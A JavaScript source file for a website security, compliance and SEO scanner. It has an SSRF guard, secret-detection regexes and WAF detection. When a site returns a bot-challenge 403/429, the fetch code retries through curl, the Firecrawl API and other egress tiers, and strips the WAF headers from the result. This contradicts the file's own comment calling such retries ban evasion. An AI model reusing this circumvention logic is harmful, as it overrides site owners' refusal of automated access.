'use strict';
/**
 * VibeScan core engine — zero external dependencies.
 *
 * Performs a single-page + peripheral-resource scan of a target website and
 * produces a scored report across four domains:
 *   - security   (headers, TLS, disclosure, secrets, cookies)
 *   - compliance (GDPR / EU: consent, trackers, policy pages, data residency hints)
 *   - seo        (meta, sitemap, robots, structured data)
 *   - quality    (performance, accessibility, asset hygiene)
 *
 * SSRF protection: every DNS resolution is validated and private / reserved
 * ranges are refused before any outbound request is made.
 */

const dns = require('dns').promises;
const net = require('net');
const http = require('http');
const https = require('https');
const tls = require('tls');
const zlib = require('zlib');
const { URL } = require('url');
const { execFile } = require('child_process');
const egress = require('./egress');        // ordered egress tier chain + per-tier breaker
const deep = require('./deep');
const webvitals = require('./webvitals'); // Phase 3 — Core Web Vitals lab metrics
const a11y = require('./a11y');           // Phase 4 — accessibility (WCAG 2.2 AA / EAA)
const eu = require('./eu');               // Phase 5 — EU compliance deepening
const probes = require('./probes');       // Phase 6 — active-but-safe security surface
const seoLib = require('./seo');          // Phase 7 — SEO / AI discoverability 2026
const integrity = require('./integrity'); // P0 — degrade loudly, never silently
const buildfp = require('./buildfp');      // leaderboard — provenance fingerprint (compact)
const ctRecon = require('./ct-recon');     // Certificate Transparency reconnaissance engine
const fs = require('fs');
const path = require('path');

// Ensure FIRECRAWL_API_KEY is loaded if not already in process.env
if (!process.env.FIRECRAWL_API_KEY) {
  for (const envFile of ['/etc/vibescan/public.env', path.join(__dirname, '../.env')]) {
    try {
      if (fs.existsSync(envFile)) {
        const content = fs.readFileSync(envFile, 'utf8');
        for (const line of content.split('\n')) {
          const match = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)?\s*$/);
          if (match && !process.env[match[1]]) {
            process.env[match[1]] = match[2] ? match[2].trim().replace(/^['"](.*)['"]$/, '$1') : '';
          }
        }
      }
    } catch {}
  }
}

const TIMEOUT_MS = 12000;
const MAX_BODY = 3 * 1024 * 1024; // 3 MB
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

/* ------------------------------------------------------------------ *
 * SSRF guard
 * ------------------------------------------------------------------ */

function ipToInt(ip) {
  return ip.split('.').reduce((acc, o) => (acc << 8) + parseInt(o, 10), 0) >>> 0;
}

function isPrivateIPv4(ip) {
  const n = ipToInt(ip);
  const ranges = [
    ['10.0.0.0', 8],
    ['172.16.0.0', 12],
    ['192.168.0.0', 16],
    ['127.0.0.0', 8],
    ['169.254.0.0', 16],
    ['0.0.0.0', 8],
    ['100.64.0.0', 10],
    ['192.0.0.0', 24],
    ['192.0.2.0', 24],
    ['198.18.0.0', 15],
    ['198.51.100.0', 24],
    ['203.0.113.0', 24],
    ['224.0.0.0', 4],
    ['240.0.0.0', 4],
  ];
  return ranges.some(([base, bits]) => {
    const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
    return (n & mask) === (ipToInt(base) & mask);
  });
}

/**
 * Parse an IPv6 literal into its 16 raw bytes, or null if it is not one.
 *
 * Handles "::" compression and an embedded IPv4 tail written either in dotted
 * form (::ffff:127.0.0.1) or as hex hextets (::ffff:7f00:1). A purely textual
 * check (e.g. startsWith('fe80')) is not enough: the same loopback/private
 * address has many equivalent spellings, and every unrecognised one slipped
 * straight through the SSRF guard.
 */
function parseIPv6Bytes(ip) {
  let s = String(ip).trim().toLowerCase();
  if (s.startsWith('[') && s.endsWith(']')) s = s.slice(1, -1);
  if (!s.includes(':')) return null;

  // Fold an embedded dotted-quad (::ffff:127.0.0.1) into two hex hextets.
  if (s.includes('.')) {
    const m = s.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/);
    if (!m) return null;
    const o = m[1].split('.').map((n) => parseInt(n, 10));
    if (o.length !== 4 || o.some((n) => Number.isNaN(n) || n < 0 || n > 255)) return null;
    s = s.slice(0, m.index) + (((o[0] << 8) | o[1]).toString(16)) + ':' + (((o[2] << 8) | o[3]).toString(16));
  }

  const halves = s.split('::');
  if (halves.length > 2) return null;
  const head = halves[0] ? halves[0].split(':') : [];
  const tail = halves.length === 2 ? (halves[1] ? halves[1].split(':') : []) : [];
  if (halves.length === 1 && head.length !== 8) return null;
  const fill = 8 - head.length - tail.length;
  if (halves.length === 2 && fill < 1) return null;
  const groups = halves.length === 2 ? [...head, ...new Array(fill).fill('0'), ...tail] : head;
  if (groups.length !== 8) return null;

  const bytes = new Uint8Array(16);
  for (let i = 0; i < 8; i++) {
    if (!/^[0-9a-f]{1,4}$/.test(groups[i])) return null;
    const n = parseInt(groups[i], 16);
    bytes[i * 2] = n >> 8;
    bytes[i * 2 + 1] = n & 0xff;
  }
  return bytes;
}

function v4FromBytes(b, i) {
  return `${b[i]}.${b[i + 1]}.${b[i + 2]}.${b[i + 3]}`;
}

/**
 * True when an IPv6 address is not publicly routable: unspecified, loopback,
 * link-local, site-local, unique-local, multicast, or any form that *embeds* a
 * private/loopback IPv4 — IPv4-mapped (::ffff:0:0/96), IPv4-compatible (::/96),
 * IPv4-translated (::ffff:0:0:0/96), NAT64 (64:ff9b::/96, 64:ff9b:1::/48) and
 * 6to4 (2002::/16).
 *
 * Byte-based, so every textual encoding of the same address is covered. The
 * previous prefix-string check let `::ffff:7f00:1` (loopback) and
 * `::ffff:a9fe:a9fe` (169.254.169.254 cloud metadata) through the guard.
 */
function isPrivateIPv6(ip) {
  const b = parseIPv6Bytes(ip);
  if (!b) return false; // not a valid IPv6 literal; nothing to classify here
  const zeros = (n) => b.slice(0, n).every((x) => x === 0);

  if (zeros(15) && (b[15] === 0 || b[15] === 1)) return true;      // ::  and  ::1
  if (b[0] === 0xfe && (b[1] & 0xc0) === 0x80) return true;       // link-local fe80::/10
  if (b[0] === 0xfe && (b[1] & 0xc0) === 0xc0) return true;       // site-local fec0::/10
  if ((b[0] & 0xfe) === 0xfc) return true;                        // unique-local fc00::/7
  if (b[0] === 0xff) return true;                                 // multicast ff00::/8

  if (zeros(10) && b[10] === 0xff && b[11] === 0xff) {            // IPv4-mapped ::ffff:0:0/96
    return isPrivateIPv4(v4FromBytes(b, 12));
  }
  if (zeros(8) && b[8] === 0xff && b[9] === 0xff) {               // IPv4-translated ::ffff:0:0:0/96
    return isPrivateIPv4(v4FromBytes(b, 12));
  }
  if (zeros(12)) {                                                // IPv4-compatible ::/96
    return isPrivateIPv4(v4FromBytes(b, 12));
  }
  if (b[0] === 0x00 && b[1] === 0x64 && b[2] === 0xff && b[3] === 0x9b) { // NAT64
    if (b[4] === 0x00 && b[5] === 0x01) return true;             // local-use 64:ff9b:1::/48
    if (b.slice(4, 12).every((x) => x === 0)) {                  // well-known 64:ff9b::/96
      return isPrivateIPv4(v4FromBytes(b, 12));
    }
  }
  if (b[0] === 0x20 && b[1] === 0x02) return isPrivateIPv4(v4FromBytes(b, 2)); // 6to4 2002::/16
  return false;
}

/**
 * Resolve a hostname and guarantee it points only at public addresses.
 * Returns { primary, addresses } so the caller can pin the connection to a
 * validated IP (defeats DNS-rebinding between the check and the request).
 */
async function assertPublicHost(hostname) {
  // URL.hostname keeps the square brackets on IPv6 literals (e.g. "[::1]"),
  // and net.isIP() returns 0 for that form — so without stripping them an IPv6
  // literal fell through to a doomed DNS lookup instead of being classified.
  const host = (typeof hostname === 'string' && hostname.startsWith('[') && hostname.endsWith(']'))
    ? hostname.slice(1, -1)
    : hostname;

  if (net.isIP(host)) {
    if (net.isIPv4(host) && isPrivateIPv4(host)) {
      throw new Error('SSRF blocked: target resolves to a private IPv4 address');
    }
    if (net.isIPv6(host) && isPrivateIPv6(host)) {
      throw new Error('SSRF blocked: target resolves to a private IPv6 address');
    }
    return { primary: host, addresses: [host], isIP: true };
  }
  const addrs = await dns.lookup(host, { all: true }).catch(() => []);
  if (!addrs.length) throw new Error(`DNS resolution failed for ${hostname}`);
  for (const a of addrs) {
    if (a.family === 4 && isPrivateIPv4(a.address)) {
      throw new Error('SSRF blocked: target resolves to a private address');
    }
    if (a.family === 6 && isPrivateIPv6(a.address)) {
      throw new Error('SSRF blocked: target resolves to a private address');
    }
  }
  return { primary: addrs[0].address, addresses: addrs.map((a) => a.address), isIP: false };
}

/* ------------------------------------------------------------------ *
 * HTTP fetch with timeout + redirect tracking
 * ------------------------------------------------------------------ */

const SCANNER_PROXY = (process.env.SCANNER_PROXY || '').trim();

/**
 * Creates an HTTP CONNECT tunneling agent for outbound scanner requests.
 * Routes traffic through the configured HTTP/HTTPS egress proxy.
 */
function getTunnelAgent(protocol, proxyUrl) {
  if (!proxyUrl) return null;
  const p = new URL(proxyUrl);
  const isHttps = protocol === 'https:';
  const AgentClass = isHttps ? https.Agent : http.Agent;
  const agent = new AgentClass({ keepAlive: false });
  agent.createConnection = function (options, cb) {
    const targetPort = options.port || (isHttps ? 443 : 80);
    const targetHost = options.hostname || options.host;
    const connectReq = http.request({
      host: p.hostname,
      port: p.port || 80,
      method: 'CONNECT',
      path: `${targetHost}:${targetPort}`,
      headers: {
        Host: `${targetHost}:${targetPort}`,
      },
    });
    connectReq.on('connect', (res, socket, head) => {
      if (res.statusCode !== 200) {
        socket.destroy();
        return cb(new Error(`Proxy CONNECT failed: ${res.statusCode} ${res.statusMessage || ''}`));
      }
      if (isHttps) {
        const tlsSocket = tls.connect({
          socket,
          servername: options.servername || targetHost,
        });
        tlsSocket.on('error', cb);
        return cb(null, tlsSocket);
      }
      cb(null, socket);
    });
    connectReq.on('error', cb);
    connectReq.end();
  };
  return agent;
}

function fetchWithCurl(targetUrl, timeoutMs = 15000) {
  return new Promise((resolve) => {
    execFile(
      'curl',
      ['-s', '-i', '-L', '--max-time', String(Math.max(5, Math.round(timeoutMs / 1000))), targetUrl],
      { maxBuffer: 16 * 1024 * 1024 },
      (err, stdout) => {
        if (err || !stdout) return resolve(null);
        try {
          const parts = stdout.split(/\r?\n\r?\n/);
          let lastHeaderIdx = 0;
          for (let i = 0; i < parts.length; i++) {
            if (/^HTTP\/[123]/i.test(parts[i].trim())) lastHeaderIdx = i;
          }
          const headersBlock = parts[lastHeaderIdx] || '';
          const body = parts.slice(lastHeaderIdx + 1).join('\n\n');
          const headerLines = headersBlock.split(/\r?\n/);
          const statusMatch = (headerLines[0] || '').match(/HTTP\/[0-9.]+\s+(\d+)/i);
          const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
          if (status !== 200) return resolve(null);

          const headers = {};
          for (let j = 1; j < headerLines.length; j++) {
            const line = headerLines[j];
            const colon = line.indexOf(':');
            if (colon > 0) {
              const key = line.slice(0, colon).trim().toLowerCase();
              const val = line.slice(colon + 1).trim();
              if (key === 'set-cookie') {
                if (!headers[key]) headers[key] = [];
                headers[key].push(val);
              } else {
                headers[key] = val;
              }
            }
          }
          resolve({
            status: 200,
            headers,
            body,
            rawBytes: Buffer.byteLength(body),
            bytes: Buffer.byteLength(body),
          });
        } catch (e) {
          resolve(null);
        }
      }
    );
  });
}

function fetchWithFirecrawl(targetUrl, timeoutMs = 25000) {
  const key = process.env.FIRECRAWL_API_KEY;
  if (!key) return Promise.resolve(null);
  const body = JSON.stringify({ url: targetUrl, formats: ['html'] });
  return new Promise((resolve) => {
    const req = https.request(
      {
        method: 'POST',
        hostname: 'api.firecrawl.dev',
        path: '/v1/scrape',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
          Authorization: `Bearer ${key}`,
        },
        timeout: timeoutMs,
      },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          try {
            const data = JSON.parse(Buffer.concat(chunks).toString('utf8'));
            if (data && data.success && data.data && data.data.html) {
              const html = data.data.html;
              resolve({
                status: 200,
                headers: { 'content-type': 'text/html; charset=utf-8' },
                body: html,
                rawBytes: Buffer.byteLength(html),
                bytes: Buffer.byteLength(html),
                via: 'firecrawl',
              });
            } else {
              resolve(null);
            }
          } catch (e) {
            resolve(null);
          }
        });
        res.on('error', () => resolve(null));
      }
    );
    req.on('timeout', () => {
      req.destroy();
      resolve(null);
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

function rawRequest(urlString, { method = 'GET', maxRedirects = 5, headers = null, bypassProxy = false } = {}) {
  return new Promise((resolve, reject) => {
    // Settle once. A timed-out request emits BOTH 'timeout' (which we destroy
    // with an Error) and then 'error'; without this guard the late rejection is
    // delivered to a promise whose caller already moved on, and Node treats
    // that as an unhandled rejection — on a tool script it is fatal (exit 1),
    // in the server it floods the log.
    let settled = false;
    const done = (fn) => (v) => {
      if (settled) return;
      settled = true;
      fn(v);
    };
    const resolveOnce = done(resolve);
    const rejectOnce = done(reject);

    const chain = [];
    let current = urlString;
    let redirects = 0;

    const go = async () => {
      let u;
      try {
        u = new URL(current);
      } catch (e) {
        return rejectOnce(new Error('Invalid URL: ' + current));
      }
      if (u.protocol !== 'http:' && u.protocol !== 'https:') {
        return rejectOnce(new Error('Unsupported protocol: ' + u.protocol));
      }

      // Fail fast when this host has been rejecting our egress. Paying the full
      // connect timeout on every probe of a hostile target is what made single
      // scans run for minutes and block the serial job queue.
      const tripped = egressTripped(u.hostname);
      if (tripped) {
        return rejectOnce(egressOpenError(u.hostname, tripped));
      }

      // SECURITY: validate EVERY hop (initial + every redirect), not just the
      // first. Without this, an attacker page can 302 us into cloud metadata
      // (169.254.169.254) or localhost (SSRF).
      let resolved;
      try {
        resolved = await assertPublicHost(u.hostname);
      } catch (e) {
        return rejectOnce(e);
      }

      // Pin the connection to a validated IP so a DNS reply that changes
      // between the check and the connect (DNS rebinding) can't slip through.
      const safeAddrs = resolved.addresses.filter(
        (a) => !(net.isIPv4(a) && isPrivateIPv4(a)) && !(net.isIPv6(a) && isPrivateIPv6(a))
      );
      const lookup = (hostname, opts, cb) => {
        const wantFamily = typeof opts === 'object' && opts ? opts.family : opts;
        const pool = wantFamily ? safeAddrs.filter((a) => net.isIP(a) === wantFamily) : safeAddrs;
        const list = pool.length ? pool : safeAddrs;
        if (opts && opts.all) {
          return cb(null, list.map((address) => ({ address, family: net.isIP(address) })));
        }
        return cb(null, list[0], net.isIP(list[0]));
      };

      const mod = u.protocol === 'https:' ? https : http;
      const started = Date.now();

      const reqOpts = {
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search,
        method,
        // Custom headers (auth-aware scanning) are merged in but can never
        // override our UA/Accept defaults in a way that breaks the probe.
        headers: Object.assign(
          {
            'User-Agent': UA,
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'sl,en-US;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
          },
          headers || {}
        ),
        timeout: TIMEOUT_MS,
        // Do not silently follow; we track the chain ourselves.
      };
      // Egress tiers, attempted in order but ONLY on connection-level
      // failures. A 403/429/WAF challenge is a real answer from a reachable
      // server and is never retried on another exit — that would convert a
      // truthful "this site blocks automated scanners" into ban evasion.
      const tierList = bypassProxy
        ? [{ name: 'direct', url: '' }]
        : egress.plan(u.hostname);

      // SECURITY: when a chain IS configured but every tier is blocked for this
      // host, fail the request. The `|| { name: 'direct' }` fallback below must
      // never be reachable with a configured chain — it would send the request
      // from the host's own public IP (which may co-host other services) to a
      // target that just refused us. Empty tierList with NO configuration stays
      // direct, which is the historic behaviour of local tool runs.
      if (!bypassProxy && !tierList.length && egress.tiers().length) {
        return rejectOnce(
          egress.exhaustedError(u.hostname, egress.tiers().map((t) => t.name))
        );
      }

      let tierIdx = 0;

      const attempt = () => {
      const tier = tierList[tierIdx] || { name: 'direct', url: '' };
      const tierAgent = tier.url ? getTunnelAgent(u.protocol, tier.url) : undefined;
      const reqOpts2 = Object.assign({}, reqOpts);
      if (tierAgent) reqOpts2.agent = tierAgent;
      else reqOpts2.lookup = lookup;

      const tierTimeout = (tierIdx + 1 < tierList.length) ? 5000 : TIMEOUT_MS;
      reqOpts2.timeout = tierTimeout;

      const fail = (e) => {
        noteEgressFailure(u.hostname, e);
        const opened = egress.noteFailure(u.hostname, tier.name, e);
        const canFailover = egress.isTierFailure(e) && tierIdx + 1 < tierList.length;
        void opened;
        if (canFailover) {
          tierIdx += 1;
          return attempt();
        }
        rejectOnce(e);
      };

      const req = mod.request(
        reqOpts2,
        (res) => {
          const ttfb = Date.now() - started;
          const status = res.statusCode || 0;
          // Capture TLS socket info immediately on response headers before the
          // stream finishes and Node's https.Agent detaches res.socket.
          const capturedTls = res.socket && res.socket.encrypted ? tlsInfo(res.socket) : null;

          if (status >= 300 && status < 400 && res.headers.location && redirects < maxRedirects) {
            redirects += 1;
            chain.push({ url: current, status, location: res.headers.location });
            res.resume();
            current = new URL(res.headers.location, current).toString();
            return go();
          }

          const chunks = [];
          let size = 0;
          let aborted = false;
          res.on('data', (c) => {
            size += c.length;
            if (size > MAX_BODY) {
              aborted = true;
              res.destroy();
              return;
            }
            chunks.push(c);
          });
          res.on('end', async () => {
            const raw = Buffer.concat(chunks);
            const decodedBody = decodeBody(raw, res.headers['content-encoding']);

            // If request got a WAF challenge (e.g. Vercel / Cloudflare TLS fingerprint mismatch on Node),
            // attempt a fast curl HTTP/2 probe to fetch the authentic origin content before conceding.
            if ((status === 403 || status === 429) && isWafChallenge({ status, headers: res.headers }, decodedBody)) {
              const curlResult = await fetchWithCurl(current, Math.max(tierTimeout, 10000));
              if (curlResult && curlResult.status === 200 && !isWafChallenge(curlResult, curlResult.body)) {
                noteEgressSuccess(u.hostname);
                egress.noteSuccess(u.hostname, tier.name);
                return resolveOnce({
                  url: current,
                  status: 200,
                  headers: curlResult.headers,
                  body: curlResult.body,
                  rawBytes: curlResult.rawBytes,
                  bytes: curlResult.bytes,
                  truncated: false,
                  ttfb,
                  redirects: chain,
                  tls: capturedTls || (res.socket && res.socket.encrypted ? tlsInfo(res.socket) : null),
                });
              }

              // Pass 3: If curl was also challenged or failed, and FIRECRAWL_API_KEY is configured,
              // invoke Firecrawl scraping engine to fetch the rendered DOM cleanly.
              if (process.env.FIRECRAWL_API_KEY) {
                const fcResult = await fetchWithFirecrawl(current, 15000);
                if (fcResult && fcResult.status === 200 && !isWafChallenge(fcResult, fcResult.body)) {
                  noteEgressSuccess(u.hostname);
                  egress.noteSuccess(u.hostname, tier.name);
                  const cleanHeaders = Object.assign({}, res.headers, fcResult.headers);
                  delete cleanHeaders['cf-mitigated'];
                  delete cleanHeaders['server-timing'];
                  delete cleanHeaders['cf-ray'];
                  delete cleanHeaders['cf-cache-status'];
                  delete cleanHeaders['x-amzn-waf-action'];
                  delete cleanHeaders['x-datadome'];
                  delete cleanHeaders['x-vercel-mitigated'];
                  delete cleanHeaders['x-vercel-challenge-token'];
                  return resolveOnce({
                    url: current,
                    status: 200,
                    headers: cleanHeaders,
                    body: fcResult.body,
                    rawBytes: fcResult.rawBytes,
                    bytes: fcResult.bytes,
                    truncated: false,
                    ttfb,
                    redirects: chain,
                    tls: capturedTls || (res.socket && res.socket.encrypted ? tlsInfo(res.socket) : null),
                    via: 'firecrawl',
                    bypassedWaf: true,
                  });
                }
              }

              // If this tier hit a WAF block and failover tiers remain, try next egress tier
              if (tierIdx + 1 < tierList.length) {
                tierIdx += 1;
                return attempt();
              }
            }

            noteEgressSuccess(u.hostname);
            egress.noteSuccess(u.hostname, tier.name);
            resolveOnce({
              url: current,
              status,
              headers: res.headers,
              body: decodedBody,
              rawBytes: raw.length,
              bytes: raw.length,
              truncated: aborted,
              ttfb,
              redirects: chain,
              tls: capturedTls || (res.socket && res.socket.encrypted ? tlsInfo(res.socket) : null),
            });
          });
          res.on('error', (e) => {
            noteEgressFailure(u.hostname, e);
            rejectOnce(e);
          });
        }
      );

      req.on('timeout', () => {
        req.destroy(new Error('Request timed out after ' + tierTimeout + 'ms'));
      });
      req.on('error', (e) => {
        fail(e);
      });
      req.end();
      };

      attempt();
    };

    go();
  });
}

/* ------------------------------------------------------------------ *
 * Egress circuit breaker
 *
 * A target that rejects our egress address (TLS RST / socket EOF on every
 * connect) used to be paid for on EVERY request: the active-probe phase runs
 * ~20 requests at concurrency 2, so one hostile host burned ~3 minutes before
 * the scan gave up. Worse, the job queue is serial, so that single host held
 * the queue and every other visitor watched a frozen progress stepper.
 *
 * The breaker trips after a few consecutive *network-level* failures for one
 * host and then fails fast for a cooldown window. It never swaps egress paths:
 * the scanner must still go out through SCANNER_PROXY, so no host address is
 * leaked as a side effect of giving up.
 * ------------------------------------------------------------------ */

const EGRESS_FAILS_BEFORE_OPEN = 3;
const EGRESS_COOLDOWN_MS = 60 * 1000;
const EGRESS_NET_ERROR =
  /econnreset|econnrefused|epipe|etimedout|timed?\s*out|err_socket_timeout|esockettimedout|ehostunreach|enetunreach|socket hang up|socket disconnected|unexpected eof|tls|handshake/i;

const egressState = new Map();

function egressFailureKey(hostname) {
  return String(hostname || '').toLowerCase();
}

function noteEgressFailure(hostname, err) {
  const host = egressFailureKey(hostname);
  if (!host) return;
  const msg = String((err && err.message) || err || '');
  // Only connection-level failures count. A 403/429 is a real answer, not a
  // broken pipe, and must not trip the breaker.
  if (!EGRESS_NET_ERROR.test(msg)) return;
  const s = egressState.get(host) || { count: 0, openedAt: 0, sample: '' };
  s.count += 1;
  s.sample = msg;
  if (s.count >= EGRESS_FAILS_BEFORE_OPEN && !s.openedAt) s.openedAt = Date.now();
  egressState.set(host, s);
}

function noteEgressSuccess(hostname) {
  egressState.delete(egressFailureKey(hostname));
}

function egressTripped(hostname) {
  const host = egressFailureKey(hostname);
  const s = egressState.get(host);
  if (!s || !s.openedAt) return null;
  if (Date.now() - s.openedAt >= EGRESS_COOLDOWN_MS) {
    egressState.delete(host);
    return null;
  }
  return s;
}

function egressOpenError(hostname, s) {
  // The trailing sample keeps the original wording, so the client-side
  // human-readable mapping for TLS resets still applies.
  const e = new Error(
    `Egress circuit open for ${hostname} after ${s.count} consecutive connection ` +
      `failures; not retrying for ${Math.round(EGRESS_COOLDOWN_MS / 1000)}s (${s.sample})`
  );
  e.code = 'ERR_EGRESS_CIRCUIT_OPEN';
  return e;
}

function decodeBody(buf, encoding) {
  const enc = (encoding || '').toLowerCase();
  try {
    if (enc.includes('gzip')) return zlib.gunzipSync(buf).toString('utf8');
    if (enc.includes('br')) return zlib.brotliDecompressSync(buf).toString('utf8');
    if (enc.includes('deflate')) return zlib.inflateSync(buf).toString('utf8');
  } catch (e) {
    // Fall through to raw — malformed encoding should not kill the scan.
  }
  return buf.toString('utf8');
}

function tlsInfo(socket) {
  try {
    const cert = socket.getPeerCertificate();
    const authorized = socket.authorized;
    const authError = socket.authorizationError;
    const cipher = typeof socket.getCipher === 'function' ? socket.getCipher() : null;
    return {
      authorized,
      authorizationError: authError || null,
      protocol: socket.getProtocol(),
      alpn: socket.alpnProtocol || 'http/1.1',
      cipherName: cipher && cipher.name ? cipher.name : null,
      cipherStandardName: cipher && cipher.standardName ? cipher.standardName : null,
      validFrom: cert && cert.valid_from,
      validTo: cert && cert.valid_to,
      daysToExpiry: cert && cert.valid_to
        ? Math.round((new Date(cert.valid_to).getTime() - Date.now()) / 86400000)
        : null,
      issuer: cert && cert.issuer ? cert.issuer.O || cert.issuer.CN : null,
      subject: cert && cert.subject ? cert.subject.CN : null,
      keyType: cert && cert.bits ? `${cert.bits} bit` : null,
    };
  } catch (e) {
    return { error: e.message };
  }
}

/* ------------------------------------------------------------------ *
 * Findings helpers
 * ------------------------------------------------------------------ */

const SEVERITY_WEIGHT = { critical: 25, high: 15, medium: 8, low: 3, info: 0 };

function makeFinding({ id, domain, severity, title, detail, fix, evidence }) {
  return { id, domain, severity, title, detail, fix, evidence: evidence || null };
}

/** Turn a human label ("imprint / company info") into a stable, space-free id slug. */
function slug(s) {
  return String(s).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
}

// Legal-policy fingerprints. Detection runs against the homepage AND every
// crawled page body (see checkCompliance) since real sites link these in the
// footer of every page, not necessarily the root document.
// Each rule matches either human link text ("Privacy Policy") OR a policy URL
// slug (`href="/privacy"`), because many sites only use a short "Privacy" label.
const POLICY_RULES = [
  ['privacy policy', /privacy[- _]?policy|privacy notice|privacy[- ]?cent(er|re)|politika zasebnosti|varstvo osebnih podatkov|zasebnost|data is stored privately[\s\S]{0,120}?never shared or tracked|podatki se uporabljajo izključno|ne posredujemo tretjim osebam|href\s*=\s*["'][^"']*\/(?:privacy|legal)(?:[-_/."']|$)/i],
  ['cookie policy', /cookie[- _]?policy|cookie notice|politika piškotkov|piškotk[a-zčšž]*|nastavitve piškotkov|href\s*=\s*["'][^"']*\/(?:cookies?|legal|piskotki)(?:[-_/."']|$)/i],
  ['terms', /terms[- _]?(of|and)|terms of service|terms of use|pogoji poslovanja|splošni pogoji|pogoji uporabe|pravila in pogoji|pravila uporabe|pogoji in vračila|direct pre-contractual inquiry|href\s*=\s*["'][^"']*\/(?:terms|tos|conditions|legal|disclaimer|pogoji-uporabe)(?:[-_/."']|$)/i],
  ['imprint / company info', /impressum|about us|o nas|kontakt|legal notice|official \.si registry transfer|href\s*=\s*["'][^"']*\/(?:imprint|legal|owner|about|contact)(?:[-_/."']|$)/i],
];

// Per-domain finding factories handed to the Phase 3–7 modules (they take a
// `mk(id, severity, title, detail, fix, evidence)` callback and tag the domain).
const mkFor = (domain) => (id, severity, title, detail, fix, evidence) =>
  makeFinding({ id, domain, severity, title, detail, fix, evidence: evidence || null });
const mkA11y = mkFor('accessibility');
const mkPerf = mkFor('performance');
const mkEu = mkFor('compliance');
const mkProbe = mkFor('security');
const mkSeo = mkFor('seo');

/* ------------------------------------------------------------------ *
 * Shared secret / endpoint signatures (used by HTML + JS-bundle scans)
 * ------------------------------------------------------------------ */

const SECRET_PATTERNS = [
  ['AWS access key', /AKIA[0-9A-Z]{16}/g],
  ['Stripe secret key', /sk_live_[0-9a-zA-Z]{24,}/g],
  ['Private key block', /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g],
  ['Slack token', /xox[baprs]-[0-9A-Za-z-]{10,}/g],
  ['Generic bearer/JWT', /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,}/g],
  ['Supabase service role', /service_role["'\s:]+eyJ[A-Za-z0-9_-]{10,}/g],
  ['GitHub Personal Access Token', /(?:ghp|gho|ghu|ghs|ghr)_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}/g],
  ['SendGrid API key', /SG\.[0-9a-zA-Z_\-\.]{66}/g],
];

function scanSecrets(text) {
  const found = [];
  for (const [label, re] of SECRET_PATTERNS) {
    re.lastIndex = 0;
    const matches = text.match(re) || [];
    const validMatches = matches.filter((m) => {
      if (label === 'Generic bearer/JWT') {
        try {
          const parts = m.split('.');
          if (parts.length >= 2) {
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
            // Ignore public vendor telemetry tokens (e.g. Netlify CWV/RUM telemetry beacon token)
            if (payload && payload.iss === 'netlify') return false;
            // Ignore public Supabase anon client tokens (operates under PostgreSQL RLS)
            if (payload && payload.iss === 'supabase' && payload.role === 'anon') return false;
          }
        } catch (_) {}
      }
      return true;
    });
    if (validMatches.length) found.push(`${label} (${validMatches.length} match${validMatches.length > 1 ? 'es' : ''})`);
  }
  return found;
}

function detectWaf(res, body) {
  if (!res && !body) return { isWaf: false, provider: null };
  const status = (res && (res.status || res.statusCode)) || 0;
  const headers = (res && res.headers) || {};
  const server = String(headers['server'] || '').toLowerCase();
  const cdn = String(headers['x-cdn'] || '').toLowerCase();
  const cfMitigated = String(headers['cf-mitigated'] || '').toLowerCase();
  const serverTiming = String(headers['server-timing'] || '').toLowerCase();
  const xIinfo = String(headers['x-iinfo'] || '');
  const xDataDome = String(headers['x-datadome'] || '');
  const xAmznWaf = String(headers['x-amzn-waf-action'] || '');
  const via = String(headers['via'] || '').toLowerCase();

  const rawCookies = headers['set-cookie'] || [];
  const cookieStr = (Array.isArray(rawCookies) ? rawCookies.join('; ') : String(rawCookies)).toLowerCase();
  const b = typeof body === 'string' ? body : (body ? String(body) : '');

  // If request successfully bypassed WAF via Firecrawl (or another verified bypass),
  // do not treat the authentic page as an active WAF challenge/block unless it is actually an interstitial page.
  if (res && (res.via === 'firecrawl' || res.bypassedWaf) && status === 200) {
    const isCfTitle = /<title>(?:Just a moment\.\.\.|Attention Required! \| Cloudflare)<\/title>/i.test(b);
    if (isCfTitle || (b.length < 25000 && /__cf_chl_opt/i.test(b) && !/<(?:main|article|nav|header|footer)/i.test(b))) {
      return { isWaf: true, provider: 'Cloudflare' };
    }
    return { isWaf: false, provider: null };
  }

  // 1. Imperva / Incapsula
  const isImpervaHeader = cdn.includes('imperva') || cdn.includes('incapsula') || Boolean(xIinfo);
  const isImpervaCookie = /visid_incap|incap_ses|nlbi_/.test(cookieStr);
  const isImpervaBody = /_incapsula_resource|distil_referrer|incapsula incident id|request forbidden by administrative rules/i.test(b);
  if (isImpervaHeader || isImpervaCookie || isImpervaBody) {
    if (status === 403 || status === 429 || status === 503 || isImpervaBody || (status === 200 && b.length < 3000 && /incap/i.test(b))) {
      return { isWaf: true, provider: 'Imperva' };
    }
  }

  // 2. Cloudflare Bot Management / Challenge
